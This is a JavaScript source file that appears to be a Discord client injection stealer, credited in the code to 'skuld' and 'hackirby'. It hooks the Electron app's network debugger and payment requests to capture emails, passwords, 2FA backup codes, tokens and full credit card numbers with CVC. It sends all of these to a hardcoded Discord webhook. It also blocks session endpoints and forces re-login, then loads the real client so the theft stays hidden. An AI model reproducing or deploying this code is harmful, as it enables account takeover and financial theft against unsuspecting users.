const fs = require('fs');
const os = require('os');
const https = require('https');
const path = require('path');
const querystring = require('querystring');
const { BrowserWindow, session } = require('electron');

const CONFIG = {
    webhook: "https://discord.com/api/webhooks/1501483874222608507/FDcwuzLFcZn57oopdAPCS317qooDz6rtPqMvU4fYgJvRmN7VOgbAg_sgQCivTPisp-1X",
    injection_url: "https://raw.githubusercontent.com/nikolas25879alt-maker/ajikhbsdfgo/main/injection.js",
    API: "https://discord.com/api/v9/users/@me",
    filters: {
        uris: [
            '/auth/login',
            '/auth/register',
            '/mfa/totp',
            '/mfa/codes-verification',
            '/users/@me',
        ],
    },
    filters2: {
        uris: [
            'wss://remote-auth-gateway.discord.gg/*',
            'https://discord.com/api/v*/auth/sessions',
            'https://*.discord.com/api/v*/auth/sessions',
            'https://discordapp.com/api/v*/auth/sessions'
        ],
    },
    payment_filters: {
        uris: [
            'https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts',
            'https://api.stripe.com/v*/tokens',
        ],
    },
    badges: {
        "Discord Employee": { Value: 1, Emoji: "<:8485discordemployee:1163172252989259898>", Rare: true },
        "Partnered Server Owner": { Value: 2, Emoji: "<:9928discordpartnerbadge:1163172304155586570>", Rare: true },
        "HypeSquad Events": { Value: 4, Emoji: "<:9171hypesquadevents:1163172248140660839>", Rare: true },
        "Bug Hunter Level 1": { Value: 8, Emoji: "<:4744bughunterbadgediscord:1163172239970140383>", Rare: true },
        "Early Supporter": { Value: 512, Emoji: "<:5053earlysupporter:1163172241996005416>", Rare: true },
        "Bug Hunter Level 2": { Value: 16384, Emoji: "<:1757bugbusterbadgediscord:1163172238942543892>", Rare: true },
        "Early Verified Bot Developer": { Value: 131072, Emoji: "<:1207iconearlybotdeveloper:1163172236807639143>", Rare: true },
        "House Bravery": { Value: 64, Emoji: "<:6601hypesquadbravery:1163172246492287017>", Rare: false },
        "House Brilliance": { Value: 128, Emoji: "<:6936hypesquadbrilliance:1163172244474822746>", Rare: false },
        "House Balance": { Value: 256, Emoji: "<:5242hypesquadbalance:1163172243417858128>", Rare: false },
        "Active Developer": { Value: 4194304, Emoji: "<:1207iconactivedeveloper:1163172534443851868>", Rare: false },
        "Certified Moderator": { Value: 262144, Emoji: "<:4149blurplecertifiedmoderator:1163172255489065481>", Rare: true },
        "Spammer": { Value: 1048704, Emoji: "☑", Rare: false },
    }
};

// ===================== FIXED REQUEST FUNCTION =====================
const request = (method, url, headers = {}, data = null) => {
    return new Promise((resolve, reject) => {
        const parsedUrl = new URL(url);
        const options = {
            protocol: parsedUrl.protocol,
            hostname: parsedUrl.hostname,
            port: parsedUrl.port || (parsedUrl.protocol === 'https:' ? 443 : 80),
            path: parsedUrl.pathname + parsedUrl.search,
            method: method,
            headers: {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
                ...headers
            }
        };

        if (data) {
            options.headers['Content-Length'] = Buffer.byteLength(data);
        }

        const req = https.request(options, (res) => {
            let responseData = '';
            res.on('data', chunk => responseData += chunk);
            res.on('end', () => {
                console.log(`[Webhook] Status: ${res.statusCode}`);
                resolve(responseData);
            });
        });

        req.on('error', (err) => {
            console.error('[Webhook Error]', err.message);
            reject(err);
        });

        if (data) req.write(data);
        req.end();
    });
};

const executeJS = script => {
    const window = BrowserWindow.getAllWindows()[0];
    return window.webContents.executeJavaScript(script, true);
};

const clearAllUserData = () => {
    executeJS("document.body.appendChild(document.createElement('iframe')).contentWindow.localStorage.clear()");
    executeJS("location.reload()");
};

const getToken = async () => {
    try {
        return await executeJS(`(webpackChunkdiscord_app.push([['']],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`);
    } catch (e) {
        return null;
    }
};

// ===================== HOOKER =====================
const hooker = async (content, token, account) => {
    try {
        content["content"] = `\`${os.hostname()}\` - \`${os.userInfo().username}\`\n${content["content"] || ''}`;
        content["username"] = "skuld - cord injection";
        content["avatar_url"] = "https://i.ibb.co/GJGxZzGX/discord-avatar-512-FCWUJ.png";
        content["embeds"][0] = content["embeds"][0] || {};
        content["embeds"][0]["author"] = { "name": account.username };
        content["embeds"][0]["thumbnail"] = { "url": `https://cdn.discordapp.com/avatars/${account.id}/${account.avatar}.webp` };
        content["embeds"][0]["footer"] = {
            "text": "skuld discord injection - made by hackirby",
            "icon_url": "https://avatars.githubusercontent.com/u/145487845?v=4",
        };
        content["embeds"][0]["title"] = "Account Information";

        const nitro = getNitro(account.premium_type);
        const badges = getBadges(account.flags);
        const billing = await getBilling(token);
        const friends = await getFriends(token);
        const servers = await getServers(token);

        content["embeds"][0]["fields"] = content["embeds"][0]["fields"] || [];
        content["embeds"][0]["fields"].push(
            { "name": "Token", "value": `\`\`\`${token}\`\`\``, "inline": false },
            { "name": "Nitro", "value": nitro, "inline": true },
            { "name": "Badges", "value": badges, "inline": true },
            { "name": "Billing", "value": billing, "inline": true }
        );

        content["embeds"].push(
            { "title": `Total Friends: ${friends.totalFriends}`, "description": friends.message },
            { "title": `Total Servers: ${servers.totalGuilds}`, "description": servers.message }
        );

        content["embeds"].forEach(embed => embed["color"] = 0xb143e3);

        await request("POST", CONFIG.webhook, {}, JSON.stringify(content));
        console.log("[+] Webhook sent successfully");
    } catch (err) {
        console.error("[-] Webhook failed:", err.message);
    }
};

const fetch = async (endpoint, headers) => {
    const data = await request("GET", CONFIG.API + endpoint, headers);
    return JSON.parse(data);
};

const fetchAccount = async token => await fetch("", { "Authorization": token });
const fetchBilling = async token => await fetch("/billing/payment-sources", { "Authorization": token });
const fetchServers = async token => await fetch("/guilds?with_counts=true", { "Authorization": token });
const fetchFriends = async token => await fetch("/relationships", { "Authorization": token });

const getNitro = flags => {
    switch (flags) {
        case 1: return 'Nitro Classic';
        case 2: return 'Nitro Boost';
        case 3: return 'Nitro Basic';
        default: return '❌';
    }
};

const getBadges = flags => {
    let badges = '';
    for (const badge in CONFIG.badges) {
        const b = CONFIG.badges[badge];
        if ((flags & b.Value) === b.Value) badges += b.Emoji + ' ';
    }
    return badges || '❌';
};

const getRareBadges = flags => {
    let badges = '';
    for (const badge in CONFIG.badges) {
        const b = CONFIG.badges[badge];
        if ((flags & b.Value) === b.Value && b.Rare) badges += b.Emoji + ' ';
    }
    return badges;
};

const getBilling = async token => {
    try {
        const data = await fetchBilling(token);
        let billing = '';
        data.forEach(x => {
            if (!x.invalid) {
                if (x.type === 1) billing += '<:paypal:1148653305376034967> ';
                else if (x.type === 2) billing += '💳 ';
            }
        });
        return billing || '❌';
    } catch { return '❌'; }
};

const getFriends = async token => {
    try {
        const friends = await fetchFriends(token);
        const filteredFriends = friends.filter(user => user.type === 1);
        let rareUsers = "";
        for (const acc of filteredFriends) {
            const badges = getRareBadges(acc.user.public_flags);
            if (badges) {
                if (!rareUsers) rareUsers = "**Rare Friends:**\n";
                rareUsers += `${badges} ${acc.user.username}\n`;
            }
        }
        return {
            message: rareUsers || "**No Rare Friends**",
            totalFriends: friends.length,
        };
    } catch {
        return { message: "**No Rare Friends**", totalFriends: 0 };
    }
};

const getServers = async token => {
    try {
        const guilds = await fetchServers(token);
        const filteredGuilds = guilds.filter(g => g.permissions === '562949953421311' || g.permissions === '2251799813685247');
        let rareGuilds = "";
        for (const guild of filteredGuilds) {
            if (!rareGuilds) rareGuilds += "**Rare Servers:**\n";
            rareGuilds += `${guild.owner ? "<:SA_Owner:991312415352430673> Owner" : "<:admin:967851956930482206> Admin"} | ${guild.name} - Members: ${guild.approximate_member_count}\n`;
        }
        return {
            message: rareGuilds || "**No Rare Servers**",
            totalGuilds: guilds.length,
        };
    } catch {
        return { message: "**No Rare Servers**", totalGuilds: 0 };
    }
};

// ===================== EVENT HANDLERS =====================
const EmailPassToken = async (email, password, token, action) => {
    const account = await fetchAccount(token);
    const content = {
        content: `**${account.username}** just **${action}**!`,
        embeds: [{
            fields: [
                { name: "Email", value: `\`${email}\``, inline: true },
                { name: "Password", value: `\`${password}\``, inline: true }
            ]
        }]
    };
    hooker(content, token, account);
};

const BackupCodesViewed = async (codes, token) => {
    const account = await fetchAccount(token);
    const filteredCodes = codes.filter(code => !code.consumed);
    const message = filteredCodes.map(code => `\`${code.code.substring(0,4)}-${code.code.substring(4)}\``).join('\n');
    const content = {
        content: `**${account.username}** just viewed his 2FA backup codes!`,
        embeds: [{
            fields: [
                { name: "Backup Codes", value: `\`\`\`${message}\`\`\``, inline: false },
                { name: "Email", value: `\`${account.email}\``, inline: true },
                { name: "Phone", value: `\`${account.phone || "None"}\``, inline: true }
            ]
        }]
    };
    hooker(content, token, account);
};

const PasswordChanged = async (newPassword, oldPassword, token) => {
    const account = await fetchAccount(token);
    const content = {
        content: `**${account.username}** just changed his password!`,
        embeds: [{
            fields: [
                { name: "New Password", value: `\`${newPassword}\``, inline: true },
                { name: "Old Password", value: `\`${oldPassword}\``, inline: true }
            ]
        }]
    };
    hooker(content, token, account);
};

const CreditCardAdded = async (number, cvc, month, year, token) => {
    const account = await fetchAccount(token);
    const content = {
        content: `**${account.username}** just added a credit card!`,
        embeds: [{
            fields: [
                { name: "Number", value: `\`${number}\``, inline: true },
                { name: "CVC", value: `\`${cvc}\``, inline: true },
                { name: "Expiration", value: `\`${month}/${year}\``, inline: true }
            ]
        }]
    };
    hooker(content, token, account);
};

const PaypalAdded = async (token) => {
    const account = await fetchAccount(token);
    const content = {
        content: `**${account.username}** just added a <:paypal:1148653305376034967> account!`,
        embeds: [{
            fields: [
                { name: "Email", value: `\`${account.email}\``, inline: true },
                { name: "Phone", value: `\`${account.phone || "None"}\``, inline: true }
            ]
        }]
    };
    hooker(content, token, account);
};

// ===================== DEBUGGER HOOKS =====================
let initiationCalled = false;
let email = "", password = "";

const createWindow = () => {
    const mainWindow = BrowserWindow.getAllWindows()[0];
    if (!mainWindow) return;

    mainWindow.webContents.debugger.attach('1.3');
    mainWindow.webContents.debugger.on('message', async (_, method, params) => {
        if (!initiationCalled) {
            initiationCalled = true;
            // You can add initiation() call here if needed
        }

        if (method !== 'Network.responseReceived') return;
        if (!CONFIG.filters.uris.some(u => params.response.url.includes(u))) return;
        if (![200, 202].includes(params.response.status)) return;

        try {
            const responseBody = await mainWindow.webContents.debugger.sendCommand('Network.getResponseBody', { requestId: params.requestId });
            const requestBody = await mainWindow.webContents.debugger.sendCommand('Network.getRequestPostData', { requestId: params.requestId });

            const responseData = JSON.parse(responseBody.body || '{}');
            const requestData = JSON.parse(requestBody.postData || '{}');

            if (params.response.url.endsWith('/login')) {
                if (responseData.token) {
                    EmailPassToken(requestData.login, requestData.password, responseData.token, "logged in");
                } else {
                    email = requestData.login;
                    password = requestData.password;
                }
            } else if (params.response.url.endsWith('/register')) {
                EmailPassToken(requestData.email, requestData.password, responseData.token, "signed up");
            } else if (params.response.url.endsWith('/totp')) {
                EmailPassToken(email, password, responseData.token, "logged in with 2FA");
            } else if (params.response.url.endsWith('/codes-verification')) {
                BackupCodesViewed(responseData.backup_codes, await getToken());
            } else if (params.response.url.endsWith('/@me') && requestData.password) {
                if (requestData.new_password) PasswordChanged(requestData.new_password, requestData.password, responseData.token);
                if (requestData.email) EmailPassToken(requestData.email, requestData.password, responseData.token, "changed his email");
            }
        } catch (e) {}
    });

    mainWindow.webContents.debugger.sendCommand('Network.enable');
    mainWindow.on('closed', createWindow);
};

createWindow();

// Payment handlers
session.defaultSession.webRequest.onCompleted(CONFIG.payment_filters, async (details) => {
    if (![200, 202].includes(details.statusCode) || details.method !== 'POST') return;
    try {
        if (details.url.includes('tokens')) {
            const item = querystring.parse(Buffer.from(details.uploadData[0].bytes).toString());
            CreditCardAdded(item['card[number]'], item['card[cvc]'], item['card[exp_month]'], item['card[exp_year]'], await getToken());
        } else if (details.url.includes('paypal_accounts')) {
            PaypalAdded(await getToken());
        }
    } catch (e) {}
});

session.defaultSession.webRequest.onBeforeRequest(CONFIG.filters2, (details, callback) => {
    callback({ cancel: true });
});

// BetterDiscord support
const bdPath = path.join(process.env.APPDATA, 'BetterDiscord', 'data', 'betterdiscord.asar');
if (fs.existsSync(bdPath)) require(bdPath);

module.exports = require("./core.asar");
